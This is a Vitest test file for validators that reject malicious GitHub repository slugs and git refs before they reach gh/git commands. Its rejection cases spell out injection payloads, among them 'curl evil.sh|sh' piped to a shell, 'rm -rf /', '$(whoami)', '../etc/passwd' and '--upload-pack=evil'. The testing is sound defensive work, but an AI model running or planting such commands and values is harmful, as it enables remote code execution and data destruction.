import { describe, expect, it } from "vitest";
import {
  assertValidGitRef,
  assertValidRepositorySlug,
  isValidRepositorySlug,
} from "../../src/utils/repository.js";

/**
 * These guard a real injection sink: `repository` and `ref` are interpolated
 * into `gh`/`git` argument lists and into GitHub API paths, and both can arrive
 * from a lockfile (committed downstream, or the `~/.agconf` store) rather than
 * from a person typing them.
 */
describe("repository slug validation", () => {
  it("accepts ordinary owner/repo slugs", () => {
    for (const ok of ["acme/standards", "a/b", "Acme-Corp/eng.standards", "org123/repo_1"]) {
      expect(isValidRepositorySlug(ok)).toBe(true);
    }
  });

  it("rejects shell metacharacters", () => {
    for (const bad of [
      "acme/standards;curl evil.sh|sh",
      "acme/$(whoami)",
      "acme/`id`",
      "acme/repo && rm -rf /",
      "acme/repo\nrm -rf /",
    ]) {
      expect(isValidRepositorySlug(bad)).toBe(false);
    }
  });

  it("rejects path traversal and flag-shaped values", () => {
    for (const bad of ["../..", "acme/..", "../etc/passwd", "-oProxyCommand=x/repo", "acme/-x"]) {
      expect(isValidRepositorySlug(bad)).toBe(false);
    }
  });

  it("rejects anything that isn't exactly two segments", () => {
    for (const bad of ["acme", "acme/", "/standards", "acme/standards/extra", ""]) {
      expect(isValidRepositorySlug(bad)).toBe(false);
    }
  });

  it("assert throws with an actionable message", () => {
    expect(() => assertValidRepositorySlug("acme/standards")).not.toThrow();
    expect(() => assertValidRepositorySlug("https://github.com/acme/standards")).toThrow(
      /owner\/repo format/,
    );
  });
});

describe("git ref validation", () => {
  it("accepts branches, tags and shas", () => {
    for (const ok of [
      "main",
      "v1.2.3",
      "release/2024-01",
      "feat/thing_1",
      "a1b2c3d",
      // Real tag shapes that a stricter pattern would wrongly reject, failing
      // every sync against a canonical repo that uses them.
      "standards@1.2.0",
      "v1.0.0+build.1",
    ]) {
      expect(() => assertValidGitRef(ok)).not.toThrow();
    }
  });

  it("rejects a tag that would execute as a shell command", () => {
    // A valid git tag — `exec` with a template string would have run this.
    expect(() => assertValidGitRef("v1.0.0$(curl evil.sh|sh)")).toThrow(/Invalid ref/);
    expect(() => assertValidGitRef("v1.0.0`id`")).toThrow(/Invalid ref/);
    expect(() => assertValidGitRef("v1;rm -rf /")).toThrow(/Invalid ref/);
  });

  it("rejects flag-shaped and traversing refs", () => {
    expect(() => assertValidGitRef("--upload-pack=evil")).toThrow(/Invalid ref/);
    expect(() => assertValidGitRef("refs/../../x")).toThrow(/Invalid ref/);
    expect(() => assertValidGitRef("")).toThrow(/Invalid ref/);
  });
});
